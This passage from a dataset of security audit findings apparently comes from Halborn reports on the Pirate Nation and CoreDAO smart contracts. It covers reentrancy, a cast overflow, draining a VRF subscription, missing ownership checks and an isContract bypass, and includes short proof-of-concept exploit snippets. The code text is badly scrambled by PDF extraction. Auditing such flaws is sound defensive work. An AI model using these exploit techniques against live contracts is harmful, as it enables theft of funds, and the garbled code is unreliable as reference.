        "body": "In the contract StakingSystem, the function claimNavyStakeRewards() is used to claim the Gold Tokens rewards for the Navy ships staked. This function calls the _claimGameItemStakeRewards() to calculate the goldOwed : Listing 6: StakingSystem.sol (Lines 448-451) address account , uint256 [] calldata stakeIndexes , bool unstake 426 function claimNavyStakeRewards ( 427 428 429 430 ) external whenNotPaused nonReentrant { 431 432 433 require ( tx . origin == account , \" USER_CALLER_ONLY : Only EOA can claim for their own  account \" 434 435 436 437 438 439 440 441 442 443 444 ); GameItemStake [] storage stakedItems = navyItemStakes [ account ]; uint256 goldOwed = 0; uint256 lastStakeIndex = stakedItems . length ; for ( uint256 idx = 0; idx < stakeIndexes . length ; idx ++) { uint256 stakeIndex = stakeIndexes [ idx ]; require ( stakeIndex < lastStakeIndex , \" STAKE_INDEX_MUST_DECREASE : StakeIndexes must be  sorted in descending order and be within bounds \" 445 446 447 ); // Claim rewards 38 448 449 450 451 452 453 454 455 456 457 458 459 460 461 462 463  popping 464 465 466 467 468 469 470 471 472 473 474 475 476 477 478 479 480 } ( uint256 goldFromShip , ) = _claimGameItemStakeRewards ( stakedItems [ stakeIndex ], unstake ); goldOwed += goldFromShip ; // Emit event emit NavyRewardsClaimed ( account , stakedItems [ stakeIndex ]. tokenId , stakedItems [ stakeIndex ]. balance , unstake , goldOwed ); // If unstaking , remove from array by swapping to end and if ( unstake ) { if ( stakedItems . length > 1) { stakedItems [ stakeIndex ] = stakedItems [ stakedItems . length - 1 ]; } stakedItems . pop () ; } lastStakeIndex = stakeIndex ; } // Mint gold rewards for user if ( goldOwed > 0) { goldToken . mint ( account , goldOwed ); } The _claimGameItemStakeRewards() itself calls the _calculateGameItemStakeRewards () function and then, in the line 794, the stake.value is updated to totalTaxInGoldPerRank: Listing 7: StakingSystem.sol (Lines 750,794) 744 function _claimGameItemStakeRewards ( 745 GameItemStake storage stake , 39 ( goldOwed , xpOwed ) = _calculateGameItemStakeRewards ( stake ); bool pirateShip = GameHelperLibrary . _isPirateShip ( bool unstake address account = _msgSender () ; 746 747 ) internal returns ( uint256 goldOwed , uint256 xpOwed ) { 748 749 750 751 752 753 754 755 756 757 758 759 if ( pirateShip ) { require ( (( block . timestamp - stake . value ) >= gameItems , stake . tokenId ! unstake || );  MINIMUM_TO_EXIT ) , 760 \" STAKE_NOT_COMPLETE : Must be staked for minimum time  before unstaking \" 761 762 763 ); // If pirate is just collecting , there is a flat tax on  their earnings 764 765 if (! unstake ) { uint256 owedToNavy = ( goldOwed *  GOLD_CLAIM_TAX_PERCENTAGE ) / 766 767 768  owner 100; _payNavyTax ( owedToNavy ); // Pay tax to navy goldOwed = goldOwed - owedToNavy ; // Rest goes to 769 770 771 772 773 774 775 776 } } else { if ( unstake ) { uint8 rank = GameHelperLibrary . _rankForNavy ( gameItems , stake . tokenId ); totalNavyRankStaked -= rank ; // Remove rank from total  staked 777 778 779 780 781 782 783 } } if ( unstake ) { // Release reservation on items _lockingSystem () . removeItemReservation ( account , 40 784 785 786 787 788 789 790 address ( gameItems ) , stake . tokenId , stake . reservationId ); // Emit event emit GameItemUnstaked ( account , stake . tokenId , stake .  balance ); 791 792 793 794 795 796 797 } } else { // Reset collection timer stake . value = uint80 ( pirateShip ? block . timestamp : totalTaxInGoldPerRank ); } Solidity 0.8 is introducing type checking for arithmetic operations, but not for type casting. Because of this, an overflow may occur in the Line 794 if totalTaxInGoldPerRank is higher than 2**80-1 = 1208925819614629174706175. If that overflow occurs any user with a Navy staked would be able to call claimNavyStakeRewards() as many times as he wanted with no time restriction minting with every call the same amount of Gold Tokens. Proof of Concept: In the image below, we can see how the user2 keeps increasing his GoldToken balance after every claimNavyStakeRewards(): 41 Risk Level: Likelihood - 4 Impact - 5 Recommendation: It is recommended to: 1. Update GameItemStake.value uint80 to at least an uint128. 2. Use OpenZeppelins SafeCast library. 42 Remediation Plan: The SOLVED: Proof of Play team GameItemStake.value to uint128. SafeCast library is now used for all the castings. fixed the On the other hand, OpenZeppelins updating issue the by 43 ",
        "labels": [
            "Halborn",
            "ProofOfPlay_Pirate_Nation",
            "Severity: High"
        ]
    },
    {
        "title": "REENTRANCY IN RAFFLEMINTV1.WITHDRAWNONRAFFLEPROCEEDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract RaffleMintV1, the function withdrawNonRaffleProceeds() is vulnerable to reentrancy as it updates the nonRaffleWithdrawableProceeds after the payable(_msgSender()).call{value: proceeds}(\"\");: Listing 8: RaffleMintV1.sol (Lines 522,526) 511 /* @notice Allows contract owner to withdraw proceeds of mints  initiated after raffle */ nonRaffleWithdrawableProceeds > 0, \" NONRAFFLE_PAYOUT_EMPTY : No proceeds available to claim \" // Ensure there are proceeds to claim require ( 512 function withdrawNonRaffleProceeds () external onlyOwner { 513 514 515 516 517 518 519 520 521 522 uint256 proceeds = nonRaffleWithdrawableProceeds ; // Pay owner proceeds ( bool sent , ) = payable ( _msgSender () ). call { value : proceeds }( \" \" );  ); 523 524 525 526 527 528 529 530 } require ( sent == true , \" NONRAFFLE_PAYOUT_UNSUCCESFUL \" ); // Proceeds are now claimed so clear amount nonRaffleWithdrawableProceeds = 0; // Emit successful proceeds claim emit NonRaffleProceedsClaimed ( _msgSender () , proceeds ); By exploiting this reentrancy, the contract owner could drain all the Ether of the smart contract and users would not be able to get a refund 44 of their losing raffle tickets. Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to set nonRaffleWithdrawableProceeds to 0 before the Ether transfer. For example: Listing 9: RaffleMintV1.sol (Lines 521,524) 511 /* @notice Allows contract owner to withdraw proceeds of mints  initiated after raffle */ ); nonRaffleWithdrawableProceeds > 0, \" NONRAFFLE_PAYOUT_EMPTY : No proceeds available to claim \" // Ensure there are proceeds to claim require ( 512 function withdrawNonRaffleProceeds () external onlyOwner { 513 514 515 516 517 518 519 520 521 522 523 524 uint256 proceeds = nonRaffleWithdrawableProceeds ; nonRaffleWithdrawableProceeds = 0; // Pay owner proceeds ( bool sent , ) = payable ( _msgSender () ). call { value : proceeds }( \" \"  ); 525 526 527 528 529 } require ( sent == true , \" NONRAFFLE_PAYOUT_UNSUCCESFUL \" ); // Emit successful proceeds claim emit NonRaffleProceedsClaimed ( _msgSender () , proceeds ); Remediation Plan: SOLVED: The Proof of Play team fixed the issue by adding the nonReentrant modifier to the withdrawNonRaffleProceeds() function. 45 ",
        "labels": [
            "Halborn",
            "ProofOfPlay_Pirate_Nation",
            "Severity: High"
        ]
    },
    {
        "title": "USERS CAN START THE SAME QUEST MULTIPLE TIMES DRAINING THE CHAINLINK VRF SUBSCRIPTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the QuestSystem contract every time a quest is completed Chainlink VRF is used: Listing 10: QuestSystem.sol (Lines 477,482) external nonReentrant whenNotPaused 436 function completeQuest ( uint64 activeQuestId ) 437 438 439 440 { 441 442 address account = _msgSender () ; ActiveQuest storage activeQuest = _activeQuests [ activeQuestId  ]; 443 444 445 446 447 448 449 450 451 452 453 454 455 456 457 458 459 // Make sure active quest exists require ( activeQuest . status == ActiveQuestStatus . IN_PROGRESS , \" INVALID_ACTIVE_QUEST_ID : ActiveQuest is not IN_PROGRESS \" ); // Check to make sure sender is the quest owner require ( activeQuest . account == account , \" INVALID_ACCOUNT : Sender did not undertake this quest \" ); // Make sure quest is still active QuestDefinition storage questDef = _questDefinitions [ activeQuest . questId ]; 46 460 461 462 463 464 465 require ( questDef . active == true , \" QUEST_NOT_ACTIVE : Cannot complete inactive quest \" ); uint256 endTime = activeQuest . startTime + questDef .  completionSeconds ; require ( endTime <= block . timestamp , \" NOT_READY_TO_COMPLETE : Quest is not ready to be completed  \" 469 470 471 ); // TODO : Maybe we fail here automatically if expire time has  passed instead of error ? 472 473 474 475 require ( questDef . expireSeconds == 0 || ( endTime + questDef . expireSeconds > block . timestamp ) , \" QUEST_HAS_EXPIRED : Quest has expired and is no longer  completeable \" ); 466 467 468 476 477 478 // Figure out final amount of gold the player earns with some  randomness 479 480 481 482 483 484 485 486 487 } uint256 requestId = _requestRandomWords (1) ; _vrfRequests [ requestId ] = VRFRequest ({ account : account , activeQuestId : activeQuestId }) ; // Change status activeQuest . status = ActiveQuestStatus . GENERATING_RESULTS ; Considering that the accountData.completions[questId] mapping is only updated after a quest is completed successfully, the QuestDefinition. MaxCompletions value can be easily bypassed. As explained in the QUESTDEFINITION.MAXCOMPLETIONS CAN BE BYPASSED BY STARTING THE SAME QUEST MULTIPLE TIMES BEFORE COMPLETING THEM issue, a user can start a quest as many times as he wants as long as he has enough inputs. 47 For ERC721 and ERC1155 inputs, as these assets are locked once a quest is started, it is not possible to perform the same quest twice. But for ERC20 inputs as there is an open TODO and this is not implemented yet, the ERC20 tokens are not locked when the quest is started, any user can start the same quest as many times as he wants. Then, after waiting a certain period of time, the same user could complete all the quests that he started. Each completion would make use of Chainlink VRF subscription. It would be possible to totally drain all the LINK balance of the subscription, as there is no limit on how many times the user could start the same quest. Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to not allow a user to start the same questId until the same questId has been completed. Remediation Plan: RISK ACCEPTED: No mitigation was added to prevent this issue. 48 ",
        "labels": [
            "Halborn",
            "ProofOfPlay_Pirate_Nation",
            "Severity: High"
        ]
    },
    {
        "title": "USERS CAN CRAFT USING AS INPUT AN NFT THEY DO NOT OWN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the CraftingSystem contract, the craft() function is called every time a new craft is started: Listing 11: CraftingSystem.sol (Lines 425-435) // Auto - Lock NFT if necessary ILockingSystem lockingSystem = _lockingSystem () ; if ( 425 } else if ( tokenType == GameRegistryLibrary . TokenType . ERC721 ) { 426 427 428 429 430 431 432 433 434 input . tokenContract , input . tokenId lockingSystem . isNFTLocked ( lockingSystem . lockNFT ( input . tokenContract , input . ) == false ) {  tokenId ); 435 } As we can see, when ERC721 tokens are used as inputs, the function does not check that the token is owned by the caller. Moreover, when an NFT is used as an input for a craft, they are locked and an exclusive reservation is created. Once the craft is completed, the exclusive reservation is removed, but not the lock. Similar to what was described in HAL-01 issue, initially a user would not be able to use the NFT of another user as input as during the lockNFT() call the transaction would revert with the ORIGIN_NOT_NFT_OWNER error. Although, once the original owner has started and completed that craft 49 with that NFT as input, the NFT would remain locked and as this NFT is already locked any user would be able now to start a craft using that NFT as the NFT ownership is not checked to create a reservation. Proof of Concept: Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is recommended to: 1. Add a require statement that checks that the caller owns the NFT in the TokenType.ERC721 if code block, in the craft() function. 50 2. Also, unlocking the NFT before removing the NFT reservation in the _unlockRecipeInput() function. Remediation Plan: The Proof of Play team SOLVED: GameHelperLibrary. _verifyInputOwnership(input, account); call in the craft() function that validates that the inputs are owned by the caller. added the 51 ",
        "labels": [
            "Halborn",
            "ProofOfPlay_Pirate_Nation",
            "Severity: High"
        ]
    },
    {
        "title": "CRAFTAMOUNT CAN BE SET TO ZERO DRAINING THE CHAINLINK VRF SUBSCRIPTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the CraftingSystem contract, the craft() function can be called It is not possible to exploit passing a 0 value as a craftAmount. this in any way when ERC1155 tokens are used as inputs, as these errors RESERVE_AMOUNT_MUST_BE_NON_ZERO, UNLOCK_AMOUNT_MUST_BE_NON_ZERO. exploit: would stop the When using ERC721 tokens as inputs, as they get an exclusive reservation, this value is not even used, and it is not possible to abuse this. But when using ERC20 tokens as inputs, it is possible to call this craft() function infinite times with no cost as no ERC20 tokens would be burnt because inputDef.tokenPointer.amount * params.craftAmount would always be zero. The attacker will never receive any reward as _completeRecipe will always be called with params.craftAmount = 0 but with every craft() call, if the RecipeDefinition.needsVRF == True, a Chainlink VRF request will be done. This means that any malicious user could abuse this in order to drain the Chainlink VRF subscription. 52 Proof of Concept: Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to add a require statement in the craft() function that checks that the craftAmount is higher than zero. 53 Remediation Plan: SOLVED: The Proof of Play team added a require statement in the craft() function that enforces that craftAmount is higher than zero. 54 ",
        "labels": [
            "Halborn",
            "ProofOfPlay_Pirate_Nation",
            "Severity: High"
        ]
    },
    {
        "title": "CRAFTS COOLDOWN TIME ARE ALWAYS ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "the In the CraftingSystem contract, lastCompletionTime in the _accountData mapping is not updated. This means that the cooldown value is never considered, so all crafts have no cooldown. when a craft is completed, Risk Level: Likelihood - 5 Impact - 2 Recommendation: It is recommended to update the lastCompletionTime value every time a craft is successfully completed. Remediation Plan: SOLVED: The value Proof of Play team the PARTIALLY lastCompletionTime called. Although, this value will be updated even if no crafts are completed successfully. This value should only be updated if at least one craft was completed successfully. updates is _completeRecipe() every time now 55 ",
        "labels": [
            "Halborn",
            "ProofOfPlay_Pirate_Nation",
            "Severity: Medium"
        ]
    },
    {
        "title": "QUESTDEFINITION.MAXCOMPLETIONS CAN BE BYPASSED BY STARTING THE SAME QUEST MULTIPLE TIMES BEFORE COMPLETING THEM",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/ProofOfPlay_Pirate_Nation_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the QuestSystem contract, the _isQuestAvailable() function is called every time a new quest is started: Listing 12: QuestSystem.sol (Lines 597-602) } return false ; if (! questDef . active ) { 573 function _isQuestAvailable ( address account , 574 uint32 questId , 575 QuestDefinition memory questDef 576 577 ) internal view returns ( bool ) { 578 579 580 581 582 583 584 585 586 587 588 589 590 591 592 593 594 595 account , questDef . requirements return false ; ) == false ); if ( ) { } // Make sure user hasn 't completed already // Perform all requirement checks IRequirementSystem requirementSystem = IRequirementSystem ( _getSystem ( GameRegistryLibrary . REQUIREMENT_SYSTEM ) requirementSystem . performAccountCheckBatch ( 56 596 597 598 599 AccountData storage accountData = _accountData [ account ]; if ( questDef . maxCompletions > 0 && accountData . completions [ questId ] >= questDef .  maxCompletions ) { return false ; } // Make sure enough time has passed before completions if ( questDef . cooldownSeconds > 0) { if ( ) { } accountData . lastCompletionTime [ questId ] + questDef . cooldownSeconds > block . timestamp return false ; } return true ; 600 601 602 603 604 605 606 607 608 609 610 611 612 613 614 615 616 } As we can see, one of the requirements checked is that the quest has not already been completed more than the QuestDefinition.MaxCompletions set. Although, the accountData.completions[questId] is only updated when a quest is completed successfully. a who user that means This this has QuestDefinition.MaxCompletions limit and complete the quests as many times as the inputs he owns allows him. All he has to do, is starting the same questId consecutively, as many times as his inputs allows him, before completing them. inputs bypass enough can Risk Level: Likelihood - 5 Impact - 2 57 Recommendation: It is recommended to not allow a user to start the same questId until the same questId has been completed. Basically, a user should not be doing the same quest twice at the same time. Remediation Plan: RISK ACCEPTED: The Proof of Play team accepted the risk of this finding. 58 3.10 (HAL-10) LACK OF PAUSABLE FUNCTIONALITY IN THE LOOTSYSTEM CONTRACT - MEDIUM  Found in Commit ID: f5c3190140139941351a68da617a91315487e917 ",
        "labels": [
            "Halborn",
            "ProofOfPlay_Pirate_Nation",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNDELEGATED COINS ARE NOT CONSIDERED ON THE REWARD DISTRIBUTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The distributePowerReward function is used to distribute delegated hash power rewards to the candidate validator. The method is designed to be called at the beginning of the turn round workflow. One potential issue with the contract is that undelegated coin rewards are not considered. This can lead to inaccurate or incomplete calculations and potentially cause issues with rewards distribution. In order to address this issue, the contract should be updated to consider undelegated coin rewards and incorporate them into the calculations for reward distribution. This will help ensure the accuracy and reliability of the reward distribution pro- cess and can help prevent potential issues or errors. With the workflow, remaining rewards directly compared to the miners total rewards. Code Location: /contracts/PledgeAgent.sol#L204 Listing 1: PledgeAgent.sol return ; function distributePowerReward ( address candidate , address [] // if no hash power is delegated in the round , return RoundState storage rs = stateMap [ roundTag ]; if ( rs . power == 1) { 1  calldata miners ) external override onlyCandidate { 2 3 4 5 6 7 8  addresses 9  delegates a BTC block 10  BTCLightClient } // distribute rewards to every miner // note that the miners are represented in the form of reward // and they can be duplicated because everytime a miner // to a validator on Core blockchain , a new record is added in 26 } Reward storage r = a. rewardSet [l -1]; if ( r . totalReward == 0 || r . round != roundTag ) { } uint256 reward = rs . coin * POWER_BLOCK_FACTOR * rs . powerFactor uint256 totalReward = reward * minerSize ; uint256 remainReward = r . remainReward ; require ( remainReward >= totalReward , \" there is not enough Agent storage a = agentsMap [ candidate ]; uint256 l = a . rewardSet . length ; if ( l == 0) { uint256 minerSize = miners . length ; return ; return ; 11 12 13 14 15 16 17 18 19 20  / 10000 * r . totalReward / r . score ; 21 22 23 24 25  reward \"); 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 delete a . rewardSet [l -1]; if ( minerSize == 0) { } else if ( totalReward != 0) { if ( r . coin == 0) { } else { } } } } } r. remainReward -= totalReward ; rewardMap [ miners [ i ]] += reward ; rewardMap [ miners [0]] += dust ; for ( uint256 i = 0; i < minerSize ; i ++) { payable ( FOUNDATION_ADDR ). transfer ( remainReward ); uint256 dust = remainReward - totalReward ; if ( dust != 0) { Risk Level: Likelihood - 1 Impact - 5 27 Proof of Concept: Listing 2 1  validator_set ): 2 3 4 5 6  MIN_INIT_DELEGATE_VALUE }) 7 8 9 10 11 12 }) def test_delegate2validator ( self , pledge_agent , candidate_hub , operator = accounts [1] consensus_address = register_candidate ( operator = operator ) candidate_hub . turnRound () assert validator_set . isValidator ( consensus_address ) tx = pledge_agent . delegateCoin ( operator , { \" value \" : expect_event (tx , \" delegatedCoin \" , { \" agent \": operator , \" delegator \" : accounts [0] , \" amount \" : MIN_INIT_DELEGATE_VALUE , \" totalAmount \" : MIN_INIT_DELEGATE_VALUE Recommendation: Ensure that undelegated coin rewards are handled by the system. Remediation Plan: SOLVED: The CoreDAO team solved the issue in this commit d2dfe11 by changing the flow in the distributePowerReward function. 28 ",
        "labels": [
            "Halborn",
            "CoreDAO_Genesis",
            "Severity: Medium"
        ]
    },
    {
        "title": "PROPOSAL CAN BE DEFEATED IF THERE IS NO MEMBER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "GovHub is the governance contract for CoreDAO, a contract that allows any member to submit proposals with the initiator address stored in the proposer field. On the GovHub contract, the proposal is marked as DEFEATED If forVotes is smaller than totalVotes/2. However, if all the members are deleted during the genesis with governance, all proposals can be defeated in the system. The system should be ensured that members length have a minimum threshold. Code Location: /contracts/GovHub.sol#L139 Listing 3: GovHub.sol (Line 248) 238 function removeMember ( address member ) external onlyInit onlyGov  { 239 240 241 242 243 244 245 246 247 248 249 } uint256 index = members [ member ]; require ( index > 0, \" member does not exist \" ); if ( index != memberSet . length ) { address addr = memberSet [ memberSet . length - 1]; memberSet [ index - 1] = addr ; members [ addr ] = index ; } memberSet . pop () ; delete members [ member ]; emit MemberDeleted ( member ); 29 Risk Level: Likelihood - 3 Impact - 3 Proof of Concept: Listing 4 function testMinimumThresholdOnTheRemoveMember () public { address public user1 = 0 address public user2 = 0 1  x9fB29AAc15b9A4B7F17c3385939b007540f4d791 ; 2  x96C42C56fdb78294F96B0cFa33c92bed7D75F96a ; 3 4 5 6 7 8 9 10 vm . startPrank ( govHubAddress ); gov_hub . removeMember ( user1 ); gov_hub . removeMember ( user2 ); gov_hub . members ; vm . stopPrank () ; } Recommendation: Consider defining a minimum threshold on the member size. 30 Remediation Plan: SOLVED: The CoreDAO team solved the issue in commit f7a91316 by adding the minimum requirement. 31 ",
        "labels": [
            "Halborn",
            "CoreDAO_Genesis",
            "Severity: Medium"
        ]
    },
    {
        "title": "ISCONTRACT MODIFIER CAN BE BYPASSED THROUGH CONSTRUCTOR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Validator can register as a Core validator candidate by calling However, feeAddress and consensus register in CandidateHub contract. address are checked with isContract modifier. the isContract function that uses EXTCODESIZE was discovered to be bypassable. The function will return false if it is invoked from a contracts constructor. Because the contract has not been deployed yet. Code Location: /contracts/CandidateHub.sol#L221 Listing 5: CandidateHub.sol (Lines 221,222) 213 function register ( address consensusAddr , address payable feeAddr  , uint32 commissionThousandths ) external payable onlyInit require ( operateMap [ msg . sender ] == 0, \" candidate already exists 214 215 216 217 {  \" ); 218 require ( int256 ( msg . value ) >= requiredMargin , \" deposit is not  enough \"); 219 require ( commissionThousandths > 0 && commissionThousandths <  1000 , \" commissionThousandths should in range (0 , 1000) \"); 220 require ( consensusMap [ consensusAddr ] == 0, \" consensus already  exists \"); 221 require (! isContract ( consensusAddr ) , \" contract is not allowed  to be consensus address \"); 222 require (! isContract ( feeAddr ) , \" contract is not allowed to be  fee address \" ); 223 224 225 // check jail status require ( jailMap [ msg . sender ] < roundTag , \" it is in jail \" ); 32 226 227 uint status = SET_CANDIDATE ; candidateSet . push ( Candidate ( msg . sender , consensusAddr , feeAddr  , commissionThousandths , int256 ( msg . value ) , status , roundTag ,  commissionThousandths )) ; 228 229 230 231 232 uint256 index = candidateSet . length ; operateMap [ msg . sender ] = index ; consensusMap [ consensusAddr ] = index ; emit registered ( msg . sender , consensusAddr , feeAddr ,  commissionThousandths , int256 ( msg . value )) ; 233 } Risk Level: Likelihood - 2 Impact - 4 Proof of Concept: Listing 6 bool public isContract ; address public addr ; 1 contract Hack { 2 3 4 5  0. 6 7 8 9 10 11 12 13 } } // When contract is being created , code size ( extcodesize ) is // This will bypass the isContract () check constructor ( address _target ) { isContract = Target ( _target ). isContract ( address ( this )) ; addr = address ( this ); // This will work Target ( _target ). protected () ; 33 Recommendation: If you want to make sure that an external owned account is calling your However, contract, a simple way is require(msg.sender == tx.origin). preventing a contract is an antipattern with security and interoperability considerations.  Reference : Solidity Issues Remediation Plan: SOLVED: The CoreDAO team solved the issue in this commit b51c87f8 by deleting the isContract check. 34 ",
        "labels": [
            "Halborn",
            "CoreDAO_Genesis",
            "Severity: Medium"
        ]
    },
    {
        "title": "BURN ADDRESS SHOULD BE DEFINED AS DIFFERENT THAN SYSTEM CONTRACTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The CoreDAO chain implements a number of dedicated built-in system con- tracts. Unlike smart contracts deployed by blockchain users, built-in system contracts were deployed at genesis time. The system contracts are increasing one by one. Instead of using the burn address as an address, the address can be defined different from the system contract addresses. Code Location: contracts/System.sol#L20 Listing 7: System.sol address public constant VALIDATOR_CONTRACT_ADDR = 0 address public constant SLASH_CONTRACT_ADDR = 0 address public constant SYSTEM_REWARD_ADDR = 0 address public constant LIGHT_CLIENT_ADDR = 0 address public constant RELAYER_HUB_ADDR = 0 1  x0000000000000000000000000000000000001000 ; 2  x0000000000000000000000000000000000001001 ; 3  x0000000000000000000000000000000000001002 ; 4  x0000000000000000000000000000000000001003 ; 5  x0000000000000000000000000000000000001004 ; 6  x0000000000000000000000000000000000001005 ; address public constant GOV_HUB_ADDR = 0 7  x0000000000000000000000000000000000001006 ; 8  x0000000000000000000000000000000000001007 ; 9 address public constant BURN_ADDR = 0  x0000000000000000000000000000000000001008 ; 10  x0000000000000000000000000000000000001009 ; address public constant FOUNDATION_ADDR = 0 address public constant PLEDGE_AGENT_ADDR = 0 address public constant CANDIDATE_HUB_ADDR = 0 35 Risk Level: Likelihood - 1 Impact - 5 Scenario:  System Burn contract should not be updated during the upgrades.  All burned funds will be located on the Burn address.  In the BSC, BurnContract address is deleted from the constant con- tract addresses. Recommendation: Ensure that BURN address is different from system contract addresses. Remediation Plan: RISK ACCEPTED: After some internal discussion, the CoreDAO team has de- cided to maintain the current implementation. Both the BSC implementation and the Core implementation require software updates to change the way in which the burn address works. 36 ",
        "labels": [
            "Halborn",
            "CoreDAO_Genesis",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING CHECK TO IF THE AGENT IS MSG.SENDER WHEN TRANSFERRING POWER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Delegators can call transferPower in PledgeAgent to transfer BTC hash The transferPower method is power delegate to a different validator. a simpler version of delegateHashPower since the delegator has already proved to be a valid BTC miner when calling delegateHashPower previously. During the code review, It has been noticed that when power is transferred, agent is set to target. However, the function can be called by multiple time because of there is no check If the m.agent is msg.sender. Code Location: /contracts/PledgeAgent.sol#L296 Listing 8 function transferPower ( address targetAgent ) external { require ( ICandidateHub ( CANDIDATE_HUB_ADDR ). canDelegate ( 1 2  targetAgent ) , \" agent is inactivated \"); 3 4 5 6  agent are the same one \" ); 7 8 9 10 11 } BtcDelegator storage m = btcDelegatorsMap [ msg . sender ]; require ( m. agent != address (0 x00 ) , \" delegator does not exist \"); address sourceAgent = m. agent ; require ( sourceAgent != targetAgent , \" source agent and target m. agent = targetAgent ; m. power = 0; emit transferredPower ( sourceAgent , targetAgent , msg . sender ); 37 Risk Level: Likelihood - 3 Impact - 3 Proof of Concept: 1. transferPower differs from transferCoin which clearly combines un- delegate and delegate steps. A BTC miner can only delegate hash power to one validator, and the rewards in each round are automat- ically distributed to them when the system executes a turn round. As a result, transferPower is actually similar to delegateHashPower instead of transferCoin. 2. However, when the power is transferred to targetAgent, there is no check If source agent power is zero. 3. Even if power is zero, the delegator can call a function multiple times. Recommendation: Consider adding a logic to verify source agent when the delegation power is transferred. Remediation Plan: SOLVED: According to the Satoshi Plus consensus algorithm, BTC hash power is measured using blocks produced on the BTC network. In the new design, mining pools no longer need to use their private keys to sign transactions on the Core blockchain. Instead, they can include delegate information directly in the blocks they generate on the BTC network. Calculations for distributing rewards to hash delegators are now performed in a dedicated function, which is called directly by the CandidateHub.turnRound method. Additionally, rewards are no longer automatically sent to hash delegators, but must be claimed in the new workflow. For that reason, the CoreDAO team has solved the issue thanks to the new improved design. As a result, the function was deleted due to the new design. 38 ",
        "labels": [
            "Halborn",
            "CoreDAO_Genesis",
            "Severity: Medium"
        ]
    },
    {
        "title": "CANDIDATES ARE NOT LIMITED ON THE REGISTRATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "One can register as a Core validator candidate by calling register in CandidateHub contract. The calling address will be used as the operator address, which represents the validator identity. However, there is no max number of candidates is defined by the system. In the CandidateHub. turnRound function calls distributeReward in ValidatorSet to distribute rewards to all roles, expect BTC hash delegators. If the candidateSet is large enough, turnRound for loops in this contract runs over an array, which can be artificially inflated If there are many registrations. An attacker can create many candidates, making the candidate Set array large. In principle, this can be done such that the gas required to execute the for loop exceeds the block gas limit, essentially making the turnRound() function inoperable. Code Location: contracts/CandidateHub.sol#L213 Listing 9 require ( operateMap [ msg . sender ] == 0, \" candidate already exists function register ( address consensusAddr , address payable feeAddr { external payable onlyInit 1  , uint32 commissionThousandths ) 2 3 4 5  \" ); 6  enough \"); 7  1000 , \" commissionThousandths should in range (0 , 1000) \"); 8  exists \"); require ( consensusMap [ consensusAddr ] == 0, \" consensus already require ( int256 ( msg . value ) >= requiredMargin , \" deposit is not require ( commissionThousandths > 0 && commissionThousandths < 39 require (! isContract ( consensusAddr ) , \" contract is not allowed require (! isContract ( feeAddr ) , \" contract is not allowed to be uint status = SET_CANDIDATE ; candidateSet . push ( Candidate ( msg . sender , consensusAddr , feeAddr // check jail status require ( jailMap [ msg . sender ] < roundTag , \" it is in jail \" ); 9  to be consensus address \"); 10  fee address \" ); 11 12 13 14 15  , commissionThousandths , int256 ( msg . value ) , status , roundTag ,  commissionThousandths )) ; 16 17 18 19 20  commissionThousandths , int256 ( msg . value )) ; 21 uint256 index = candidateSet . length ; operateMap [ msg . sender ] = index ; consensusMap [ consensusAddr ] = index ; emit registered ( msg . sender , consensusAddr , feeAddr , } Risk Level: Likelihood - 2 Impact - 4 Proof of Concept: Listing 10 function testRegister () public { for ( uint i =0; i < addrSet . length ; i ++) { address newCandidate = addrSet [ i ]; vm . startPrank ( newCandidate , newCandidate ); candidateHub . register { value : 10000 ether }( newCandidate , 1 2 3 4 5  payable ( newCandidate ) , 10) ; 6 7 8 vm . stopPrank () ; } } 40 Recommendation: Consider define governance parameter like a newMaxNumOfCandidates. Remediation Plan: SOLVED: The CoreDAO team solved the issue in commit 6d456cf2 by adding CANDIDATE_COUNT_LIMIT. 41 ",
        "labels": [
            "Halborn",
            "CoreDAO_Genesis",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING ONLY INIT MODIFIER",
